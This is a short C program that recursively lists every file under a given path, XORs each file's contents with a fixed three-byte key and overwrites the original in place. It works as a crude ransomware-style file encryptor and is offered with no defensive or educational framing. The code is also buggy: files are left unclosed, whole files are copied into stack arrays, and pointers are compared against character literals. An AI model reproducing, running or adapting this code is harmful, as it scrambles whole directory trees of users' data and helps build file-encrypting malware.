#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <ftw.h>
#include <sys/stat.h>
#include <string.h>

struct filez {
	uint8_t *buffer;
	uint64_t size;
};
typedef struct filez Filez;

//Function prototypes
Filez readfile(uint8_t *);
void writefile(uint8_t *, uint8_t *, uint64_t);
void encryptDecrypt(uint8_t *, uint8_t *, uint64_t);
int list(const char *name, const struct stat *status, int type);
uint8_t **add_string(uint8_t **, const uint8_t *);
void encryptFiles(uint8_t **);

// stores all the files
uint8_t** files;

int main(int argc, uint8_t *argv[]) {
	// initalize array
	files = (uint8_t**) malloc(1 * sizeof(uint8_t*));
	files[0] = '\0';

	// get starting path
	if (argc != 2) {
		printf("Usage %s <starting path>\n", argv[0]);
		return 1;
	}

	// get files at path
	ftw(argv[1], list, 1);

	// start encryption
	encryptFiles(files);

	return 0;
}

void encryptFiles (uint8_t** array) {
    uint8_t* str; int i=0;
    while ((str = array[i]) != '\0') {
		// read file into buffer
		Filez file = readfile(str);
		
		// encrypt file
		uint8_t encrypted[file.size];
		encryptDecrypt(file.buffer, encrypted, file.size);

		// write out to disk
		writefile(str, encrypted, file.size);

		free(file.buffer);
        i++;
    }
}

int list(const char *name, const struct stat *status, int type) {
	if(type == FTW_NS)
		return 0;

	if(type == FTW_F)
		files = add_string(files, name);

	return 0;
}

uint8_t **add_string(uint8_t **array, const uint8_t *string) {

    int lastIndex = 0;
    while (array[lastIndex] != '\0')
        lastIndex++;

    /*reallocate so the array of strings can hold one more string; note that lastIndex is zero-based; 
    hence, the size of the current array is lastIndex+1, and consequently the size of the new array 
    needs to be lastIndex+2 */
    uint8_t** newArray = (uint8_t**)realloc(array, (lastIndex+2) * sizeof (uint8_t*));
    if (!newArray) return array;

    /*allocate memory for new string*/
    uint8_t* newString = strdup(string);
    if (!newString) return newArray;

    newArray[lastIndex++] = newString;
    newArray[lastIndex] = '\0';

    return newArray;
}

void encryptDecrypt(uint8_t *input, uint8_t *output, uint64_t size) {
	uint8_t key[] = {'A', 'B', 'C'}; //Can be any chars, and any size array
	
	for(int i = 0; i < size; i++) {
		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(uint8_t))];
	}
}

void writefile(uint8_t *name, uint8_t *content, uint64_t size) {
	FILE *fp = fopen(name, "wb");
	fwrite(content, 1, size, fp);
}

Filez readfile(uint8_t *name) {
	Filez file;
	// uint8_t *buffer;
	// get file pointer
	FILE *fp = fopen(name, "rb");

	// get file size
	fseek(fp, 0, SEEK_END);
	file.size = ftell(fp);
	rewind(fp);

	// initalize buffer with file size
	file.buffer = (uint8_t *)malloc((file.size+1)*sizeof(uint8_t));

	// read all characters into buffer
	fread(file.buffer, 1, file.size, fp);

	// close file
	fclose(fp);

	return file;
}
